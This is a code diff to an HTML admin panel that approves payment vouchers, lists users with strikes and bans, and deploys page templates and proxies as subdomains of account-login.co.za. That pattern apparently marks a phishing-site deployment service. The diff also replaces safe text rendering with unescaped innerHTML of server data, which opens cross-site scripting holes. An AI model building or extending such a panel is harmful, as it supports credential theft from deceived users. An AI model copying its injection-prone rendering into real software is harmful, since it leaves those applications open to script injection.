@@ -6,18 +6,21 @@
     <title>D-TECH Cloud Admin</title>
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f4f4f9; color: #333; padding: 20px; }
-        .container { max-width: 800px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .container { max-width: 1000px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
         h1 { margin-top: 0; color: #0070f3; }
         .form-group { margin-bottom: 20px; }
         label { display: block; margin-bottom: 5px; font-weight: bold; }
         input[type="text"], textarea, select { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
         textarea { height: 150px; font-family: monospace; }
-        button { background: #0070f3; color: #fff; border: none; padding: 12px 20px; border-radius: 4px; cursor: pointer; font-size: 16px; width: 100%; }
+        button { background: #0070f3; color: #fff; border: none; padding: 10px 15px; border-radius: 4px; cursor: pointer; font-size: 14px; }
         button.btn-danger { background: #d32f2f; }
+        button.btn-success { background: #28a745; }
         button:hover { opacity: 0.9; }
-        .tabs { display: flex; margin-bottom: 20px; border-bottom: 2px solid #eee; }
-        .tab { padding: 10px 20px; cursor: pointer; border-bottom: 2px solid transparent; margin-bottom: -2px; }
+
+        .tabs { display: flex; margin-bottom: 20px; border-bottom: 2px solid #eee; overflow-x: auto; }
+        .tab { padding: 10px 20px; cursor: pointer; border-bottom: 2px solid transparent; margin-bottom: -2px; white-space: nowrap; }
         .tab.active { border-bottom-color: #0070f3; color: #0070f3; font-weight: bold; }
+
         .hidden { display: none; }
         #message { margin-top: 20px; padding: 10px; border-radius: 4px; display: none; }
         .success { background: #d4edda; color: #155724; }
@@ -29,6 +32,13 @@
         table { width: 100%; border-collapse: collapse; margin-bottom: 20px; }
         th, td { padding: 10px; text-align: left; border-bottom: 1px solid #eee; }
         th { background: #fafafa; }
+
+        /* Badges */
+        .badge { padding: 4px 8px; border-radius: 12px; font-size: 12px; font-weight: bold; text-transform: uppercase; }
+        .badge-pending { background: #ffeeba; color: #856404; }
+        .badge-active { background: #d4edda; color: #155724; }
+        .badge-locked { background: #f8d7da; color: #721c24; }
+        .badge-banned { background: #333; color: #fff; }
     </style>
 </head>
 <body>
@@ -39,13 +49,29 @@
         <h1>🚀 Cloud Admin Panel</h1>
 
         <div class="tabs">
-            <div class="tab active" onclick="switchTab('templates')">Manage Templates</div>
-            <div class="tab" onclick="switchTab('sites')">Manage Sites</div>
-            <div class="tab" onclick="switchTab('proxy')">Deploy Proxy (Admin)</div>
+            <div class="tab active" onclick="switchTab('vouchers')">Pending Vouchers</div>
+            <div class="tab" onclick="switchTab('users')">Manage Users</div>
+            <div class="tab" onclick="switchTab('templates')">Templates</div>
+            <div class="tab" onclick="switchTab('sites')">Sites</div>
+            <div class="tab" onclick="switchTab('proxy')">Deploy Proxy</div>
+        </div>
+
+        <!-- Vouchers Section -->
+        <div id="vouchers-section" class="form-section">
+            <h2>Pending Payments</h2>
+            <button onclick="loadVouchers()" style="margin-bottom: 10px;">Refresh</button>
+            <div id="voucher-list">Loading...</div>
+        </div>
+
+        <!-- Users Section -->
+        <div id="users-section" class="form-section hidden">
+            <h2>User Database</h2>
+            <button onclick="loadUsers()" style="margin-bottom: 10px;">Refresh</button>
+            <div id="user-list">Loading...</div>
         </div>
 
         <!-- Templates Section -->
-        <div id="templates-section" class="form-section">
+        <div id="templates-section" class="form-section hidden">
             <h2>Existing Templates</h2>
             <div id="template-list">Loading...</div>
 
@@ -65,11 +91,11 @@
         <!-- Sites Section -->
         <div id="sites-section" class="form-section hidden">
             <h2>Manage Deployed Sites</h2>
-            <button onclick="loadSites()" style="width:auto; margin-bottom:10px;">Refresh List</button>
+            <button onclick="loadSites()" style="margin-bottom:10px;">Refresh List</button>
             <div id="site-list">Loading...</div>
         </div>
 
-        <!-- Proxy Form (Legacy Admin Feature) -->
+        <!-- Proxy Form -->
         <div id="proxy-section" class="form-section hidden">
             <p>Admin-only proxy deployment (bypasses templates).</p>
             <div class="form-group">
@@ -93,16 +119,24 @@
             document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
             document.querySelectorAll('.form-section').forEach(f => f.classList.add('hidden'));
 
-            if (tab === 'templates') {
+            if (tab === 'vouchers') {
                 document.querySelector('.tabs .tab:nth-child(1)').classList.add('active');
+                document.getElementById('vouchers-section').classList.remove('hidden');
+                loadVouchers();
+            } else if (tab === 'users') {
+                document.querySelector('.tabs .tab:nth-child(2)').classList.add('active');
+                document.getElementById('users-section').classList.remove('hidden');
+                loadUsers();
+            } else if (tab === 'templates') {
+                document.querySelector('.tabs .tab:nth-child(3)').classList.add('active');
                 document.getElementById('templates-section').classList.remove('hidden');
                 loadTemplates();
             } else if (tab === 'sites') {
-                document.querySelector('.tabs .tab:nth-child(2)').classList.add('active');
+                document.querySelector('.tabs .tab:nth-child(4)').classList.add('active');
                 document.getElementById('sites-section').classList.remove('hidden');
                 loadSites();
             } else {
-                document.querySelector('.tabs .tab:nth-child(3)').classList.add('active');
+                document.querySelector('.tabs .tab:nth-child(5)').classList.add('active');
                 document.getElementById('proxy-section').classList.remove('hidden');
             }
         }
@@ -117,50 +151,125 @@
             reader.readAsText(file);
         }
 
+        // --- VOUCHERS ---
+        async function loadVouchers() {
+            const div = document.getElementById('voucher-list');
+            div.innerHTML = 'Loading...';
+            try {
+                const res = await fetch(`${WORKER_URL}/api/admin/vouchers`, { credentials: 'include' });
+                if (res.status === 401) { window.location.href = 'login.html'; return; }
+                const data = await res.json();
+
+                div.innerHTML = '';
+                if (data.success && data.data.length > 0) {
+                    const table = document.createElement('table');
+                    table.innerHTML = `<thead><tr>
+                        <th>Time</th><th>User Code</th><th>Type</th><th>Voucher Code</th><th>Plan</th><th>Action</th>
+                    </tr></thead>`;
+                    const tbody = document.createElement('tbody');
+                    data.data.forEach(v => {
+                        const tr = document.createElement('tr');
+                        tr.innerHTML = `
+                            <td>${new Date(v.submitted).toLocaleString()}</td>
+                            <td>${v.uniqueCode}</td>
+                            <td>${v.voucherType}</td>
+                            <td><code>${v.voucherCode}</code></td>
+                            <td>${v.plan.toUpperCase()}</td>
+                            <td>
+                                <button class="btn-success" onclick="processVoucher('${v.id}', 'approve')">Approve</button>
+                                <button class="btn-danger" onclick="declineVoucher('${v.id}')">Decline</button>
+                            </td>
+                        `;
+                        tbody.appendChild(tr);
+                    });
+                    table.appendChild(tbody);
+                    div.appendChild(table);
+                } else {
+                    div.innerHTML = '<p>No pending vouchers.</p>';
+                }
+            } catch (e) { div.innerHTML = 'Error: ' + e.message; }
+        }
+
+        async function processVoucher(id, action, reason = null) {
+            if (!confirm(`Are you sure you want to ${action} this voucher?`)) return;
+            try {
+                const res = await fetch(`${WORKER_URL}/api/admin/voucher_action`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ voucherId: id, action, reason }),
+                    credentials: 'include'
+                });
+                const data = await res.json();
+                if(data.success) {
+                    showMessage(`Voucher ${action}d successfully`, 'success');
+                    loadVouchers();
+                } else {
+                    showMessage(data.error, 'error');
+                }
+            } catch (e) { showMessage(e.message, 'error'); }
+        }
+
+        function declineVoucher(id) {
+            const reason = prompt("Enter reason for declining (e.g. Invalid Code):", "Invalid/Used Voucher");
+            if (reason) {
+                processVoucher(id, 'decline', reason);
+            }
+        }
+
+        // --- USERS ---
+        async function loadUsers() {
+             const div = document.getElementById('user-list');
+            div.innerHTML = 'Loading...';
+            try {
+                const res = await fetch(`${WORKER_URL}/api/admin/users`, { credentials: 'include' });
+                const data = await res.json();
+
+                div.innerHTML = '';
+                if (data.success && data.data.length > 0) {
+                    const table = document.createElement('table');
+                    table.innerHTML = `<thead><tr>
+                        <th>Unique Code</th><th>Plan</th><th>Status</th><th>Strikes</th><th>Expiry</th>
+                    </tr></thead>`;
+                    const tbody = document.createElement('tbody');
+                    data.data.forEach(u => {
+                        const expiry = u.expiry ? new Date(u.expiry).toLocaleDateString() : 'N/A';
+                        const tr = document.createElement('tr');
+                        tr.innerHTML = `
+                            <td>${u.code}</td>
+                            <td>${u.plan.toUpperCase()}</td>
+                            <td><span class="badge badge-${u.status}">${u.status.toUpperCase()}</span></td>
+                            <td>${u.strikes || 0}</td>
+                            <td>${expiry}</td>
+                        `;
+                        tbody.appendChild(tr);
+                    });
+                    table.appendChild(tbody);
+                    div.appendChild(table);
+                } else {
+                    div.innerHTML = '<p>No users found.</p>';
+                }
+            } catch (e) { div.innerHTML = 'Error: ' + e.message; }
+        }
+
+        // --- SITES ---
         async function loadSites() {
             const list = document.getElementById('site-list');
             list.innerHTML = 'Loading...';
             try {
                 const res = await fetch(`${WORKER_URL}/api/admin/sites`, { credentials: 'include' });
-                if (res.status === 401) { window.location.href = 'login.html'; return; }
                 const data = await res.json();
                 list.innerHTML = '';
 
                 if (data.success && data.data.length > 0) {
                     const table = document.createElement('table');
-
-                    const thead = document.createElement('thead');
-                    const headerRow = document.createElement('tr');
-                    ['Subdomain', 'Action'].forEach(text => {
-                        const th = document.createElement('th');
-                        th.textContent = text;
-                        headerRow.appendChild(th);
-                    });
-                    thead.appendChild(headerRow);
-                    table.appendChild(thead);
-
+                    table.innerHTML = `<thead><tr><th>Subdomain</th><th>Action</th></tr></thead>`;
                     const tbody = document.createElement('tbody');
                     data.data.forEach(site => {
                         const tr = document.createElement('tr');
-
-                        const tdName = document.createElement('td');
-                        const link = document.createElement('a');
-                        link.href = `https://${site}.account-login.co.za`;
-                        link.target = '_blank';
-                        link.textContent = site;
-                        tdName.appendChild(link);
-
-                        const tdAction = document.createElement('td');
-                        const btn = document.createElement('button');
-                        btn.className = 'btn-danger';
-                        btn.style.width = 'auto';
-                        btn.style.padding = '5px 10px';
-                        btn.textContent = 'Delete';
-                        btn.onclick = () => deleteSite(site);
-                        tdAction.appendChild(btn);
-
-                        tr.appendChild(tdName);
-                        tr.appendChild(tdAction);
+                        tr.innerHTML = `
+                            <td><a href="https://${site}.account-login.co.za" target="_blank">${site}</a></td>
+                            <td><button class="btn-danger" onclick="deleteSite('${site}')">Delete</button></td>
+                        `;
                         tbody.appendChild(tr);
                     });
                     table.appendChild(tbody);
@@ -180,72 +289,37 @@
                      method: 'DELETE',
                      credentials: 'include'
                  });
-                 if (res.status === 401) { window.location.href = 'login.html'; return; }
                  loadSites();
-            } catch(e) {
-                alert(e.message);
-            }
+            } catch(e) { alert(e.message); }
         }
 
+        // --- TEMPLATES ---
         async function loadTemplates() {
             try {
                 const res = await fetch(`${WORKER_URL}/api/admin/templates`, { credentials: 'include' });
-
-                if (res.status === 401) {
-                    window.location.href = 'login.html';
-                    return;
-                }
-
+                if (res.status === 401) { window.location.href = 'login.html'; return; }
                 const data = await res.json();
                 const list = document.getElementById('template-list');
-                list.innerHTML = ''; // Clear loading
+                list.innerHTML = '';
 
                 if (data.success && data.data.length > 0) {
                     const table = document.createElement('table');
-
-                    // Header
-                    const thead = document.createElement('thead');
-                    const headerRow = document.createElement('tr');
-                    const thName = document.createElement('th');
-                    thName.textContent = 'Name';
-                    const thAction = document.createElement('th');
-                    thAction.textContent = 'Action';
-                    headerRow.appendChild(thName);
-                    headerRow.appendChild(thAction);
-                    thead.appendChild(headerRow);
-                    table.appendChild(thead);
-
-                    // Body
+                    table.innerHTML = `<thead><tr><th>Name</th><th>Action</th></tr></thead>`;
                     const tbody = document.createElement('tbody');
                     data.data.forEach(tpl => {
                         const tr = document.createElement('tr');
-
-                        const tdName = document.createElement('td');
-                        tdName.textContent = tpl.name;
-
-                        const tdAction = document.createElement('td');
-                        const btn = document.createElement('button');
-                        btn.className = 'btn-danger';
-                        btn.style.width = 'auto';
-                        btn.style.padding = '5px 10px';
-                        btn.textContent = 'Delete';
-                        btn.onclick = () => deleteTemplate(tpl.name);
-                        tdAction.appendChild(btn);
-
-                        tr.appendChild(tdName);
-                        tr.appendChild(tdAction);
+                        tr.innerHTML = `
+                            <td>${tpl.name}</td>
+                            <td><button class="btn-danger" onclick="deleteTemplate('${tpl.name}')">Delete</button></td>
+                        `;
                         tbody.appendChild(tr);
                     });
                     table.appendChild(tbody);
                     list.appendChild(table);
                 } else {
-                    const p = document.createElement('p');
-                    p.textContent = 'No templates found.';
-                    list.appendChild(p);
+                    list.innerHTML = '<p>No templates found.</p>';
                 }
-            } catch (e) {
-                document.getElementById('template-list').innerText = 'Error loading templates.';
-            }
+            } catch (e) { document.getElementById('template-list').innerText = 'Error loading templates.'; }
         }
 
         async function saveTemplate() {
@@ -253,7 +327,7 @@
             const content = document.getElementById('tpl-content').value;
             if (!name || !content) return showMessage('Missing fields', 'error');
 
-            const btn = document.querySelector('button'); // Careful selector
+            const btn = document.querySelector('#templates-section button');
             const originalText = btn.innerText;
             btn.innerText = 'Saving...';
 
@@ -264,10 +338,6 @@
                     body: JSON.stringify({name, content}),
                     credentials: 'include'
                 });
-                if (res.status === 401) {
-                    window.location.href = 'login.html';
-                    return;
-                }
                 const data = await res.json();
                 if (data.success) {
                     showMessage('Template saved!', 'success');
@@ -277,9 +347,7 @@
                 } else {
                     showMessage(data.error, 'error');
                 }
-            } catch (e) {
-                showMessage(e.message, 'error');
-            }
+            } catch (e) { showMessage(e.message, 'error'); }
             btn.innerText = originalText;
         }
 
@@ -290,14 +358,8 @@
                      method: 'DELETE',
                      credentials: 'include'
                  });
-                 if (res.status === 401) {
-                     window.location.href = 'login.html';
-                     return;
-                 }
                  loadTemplates();
-            } catch(e) {
-                alert(e.message);
-            }
+            } catch(e) { alert(e.message); }
         }
 
         async function saveProxy() {
@@ -312,10 +374,6 @@
                     body: JSON.stringify({ subdomain, type: 'PROXY', content }),
                     credentials: 'include'
                 });
-                if (response.status === 401) {
-                    window.location.href = 'login.html';
-                    return;
-                }
                 const result = await response.json();
                 if (result.success) showMessage('Proxy created!', 'success');
                 else showMessage(result.error, 'error');
@@ -329,10 +387,11 @@
             el.innerText = text;
             el.className = type;
             el.style.display = 'block';
+            setTimeout(() => { el.style.display = 'none'; }, 5000);
         }
 
         // Initial load
-        loadTemplates();
+        loadVouchers();
     </script>
 </body>
 </html>
